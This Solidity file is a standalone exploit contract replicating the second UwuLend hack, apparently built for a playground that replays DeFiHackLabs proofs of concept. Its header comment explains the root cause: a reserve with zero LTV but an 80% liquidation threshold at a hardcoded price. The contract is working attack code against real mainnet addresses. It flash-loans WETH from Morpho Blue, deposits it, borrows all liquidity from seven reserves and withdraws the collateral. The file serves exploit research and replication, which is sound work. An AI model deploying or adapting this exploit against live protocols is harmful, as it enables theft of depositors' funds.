// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-06-UwuLend_Second).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (UwuLend_Second_exp is Test; attacker = address(this); the Morpho Blue flash-loan
// callback `onMorphoFlashLoan` lives on the test itself), so there is no standalone
// exploit contract to deploy. This contract is a faithful, self-contained copy of
// that inline attack so the playground can deploy it and record run(). Logic and
// constants are copied verbatim from test/UwuLend_Second_exp.sol.
//
// Root cause: UwuLend's sUSDE reserve was reconfigured after the FIRST UwuLend
// hack to LTV = 0 (cannot open new borrows) but its liquidation threshold was left
// at 80%, priced by a hardcoded CustomPriceGetter returning $1.04. LTV gates new
// borrows; liquidation threshold gates the health factor (and therefore
// withdrawals). The attacker already holds 60,000,000 sUSDE (worth $62.4M at the
// hardcoded price but $0 borrowing power due to LTV=0). It flash-loans WETH
// (fee-free, from Morpho Blue), deposits it as collateral to open borrowing power,
// borrows the entire liquidity of 7 reserves, then withdraws all the WETH back —
// the withdrawal's health-factor check leans on sUSDE's 80% liquidation threshold,
// which alone keeps HF far above 1 even with zero WETH collateral left. The WETH
// flash loan is repaid, and the attacker walks away with the borrowed WETH plus
// all the borrowed stablecoins/CRV, leaving the 60M sUSDE behind as bad debt.

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface ILendingPool {
    function getUserAccountData(address user)
        external
        view
        returns (
            uint256 totalCollateralETH,
            uint256 totalDebtETH,
            uint256 availableBorrowsETH,
            uint256 currentLiquidationThreshold,
            uint256 ltv,
            uint256 healthFactor
        );
    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
        external;
    function withdraw(address asset, uint256 amount, address to) external returns (uint256);
}

interface IMorphoBlueFlashLoan {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

contract UwuLendSecondDrain {
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 constant uSUSDE = IERC20(0xf1293141fC6ab23b2a0143Acc196e3429e0B67A6);
    IERC20 constant uWETH = IERC20(0x67fadbD9Bf8899d7C578db22D7af5e2E500E13e5);
    IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 constant crvUSD = IERC20(0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E);
    IERC20 constant CRV = IERC20(0xD533a949740bb3306d119CC777fa900bA034cd52);
    IERC20 constant LUSD = IERC20(0x5f98805A4E8be255a32880FDeC7F6728C6568bA0);
    IERC20 constant FRAX = IERC20(0x853d955aCEf822Db058eb8505911ED77F175b99e);

    IERC20 constant uCRV = IERC20(0xdb1A8f07f6964EFcFfF1Aa8025b8ce192Ba59Eba);
    IERC20 constant ucrvUSD = IERC20(0xeb61e567cbAeAccb6C259deF92900bc59d8a14cC);
    IERC20 constant uDAI = IERC20(0xb95BD0793bCC5524AF358ffaae3e38c3903C7626);
    IERC20 constant uUSDT = IERC20(0x24959F75d7BDA1884f1Ec9861f644821Ce233c7D);
    IERC20 constant uFRAX = IERC20(0x8C240C385305aeb2d5CeB60425AABcb3488fa93d);
    IERC20 constant uLUSD = IERC20(0xaDFa5Fa0c51d11B54C8a0B6a15F47987BD500086);

    ILendingPool constant uwuLendPool = ILendingPool(0x2409aF0251DCB89EE3Dee572629291f9B087c668);
    IMorphoBlueFlashLoan constant morphoBlueFlashLoan = IMorphoBlueFlashLoan(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);

    // Entry point: this contract must already hold 60,000,000 sUSDE (seeded via
    // the playground's dealToken setup step, mirroring the test's vm.prank
    // transfer from the real attacker EOA) before run() is called.
    function run() external {
        morphoBlueFlashLoan.flashLoan(address(WETH), WETH.balanceOf(address(morphoBlueFlashLoan)), new bytes(0));
    }

    function onMorphoFlashLoan(uint256 amounts, bytes calldata) external {
        WETH.approve(address(msg.sender), type(uint256).max);
        WETH.approve(address(uwuLendPool), type(uint256).max);

        // Deposit WETH to uwuLendPool as collateral
        uwuLendPool.deposit(address(WETH), amounts, address(this), 0);

        // Borrow the entire liquidity of 7 reserves against the position
        uwuLendPool.borrow(address(WETH), WETH.balanceOf(address(uWETH)) - amounts, 2, 0, address(this));
        uwuLendPool.borrow(address(CRV), CRV.balanceOf(address(uCRV)), 2, 0, address(this));
        uwuLendPool.borrow(address(crvUSD), crvUSD.balanceOf(address(ucrvUSD)), 2, 0, address(this));
        uwuLendPool.borrow(address(DAI), DAI.balanceOf(address(uDAI)), 2, 0, address(this));
        uwuLendPool.borrow(address(USDT), USDT.balanceOf(address(uUSDT)), 2, 0, address(this));
        uwuLendPool.borrow(address(FRAX), FRAX.balanceOf(address(uFRAX)), 2, 0, address(this));
        uwuLendPool.borrow(address(LUSD), LUSD.balanceOf(address(uLUSD)), 2, 0, address(this));

        // Withdraw all WETH collateral back — the health factor check leans on
        // sUSDE's 80% liquidation threshold, which alone keeps HF far above 1.
        uwuLendPool.withdraw(address(WETH), type(uint256).max, address(this));
    }
}
